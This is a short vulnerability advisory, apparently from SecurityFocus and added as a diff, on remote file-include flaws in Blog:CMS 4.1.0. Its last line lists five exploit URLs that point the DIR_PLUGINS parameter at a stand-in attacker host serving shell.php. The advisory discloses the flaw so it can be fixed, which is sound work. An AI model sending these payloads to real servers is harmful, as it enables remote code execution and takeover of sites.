@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/19577/info
+
+Blog:CMS is prone to multiple remote file-include vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker can exploit these issues to include an arbitrary remote file containing malicious PHP code and execute it in the context of the webserver process. This may facilitate a compromise of the application and the underlying system; other attacks are also possible.
+
+Version 4.1.0 is vulnerable; other versions may also be affected.
+
+http://www.example.com/dir_blogccms/index.php?DIR_PLUGINS=http://evalsite.com/shell.php? http://www.example.com/dir_blogccms/admin/media.php?DIR_PLUGINS=http://evalsite.com/shell.php? http://www.example.com/dir_blogccms/extras/fancyurls/archive.php?DIR_PLUGINS=http://evalsite.com/shell.php? http://www.example.com/dir_blogccms/extras/fancyurls/archives.php?DIR_PLUGINS=http://evalsite.com/shell.php? http://www.example.com/dir_blogccms/extras/fancyurls/blog.php?DIR_PLUGINS=http://evalsite.com/shell.php?
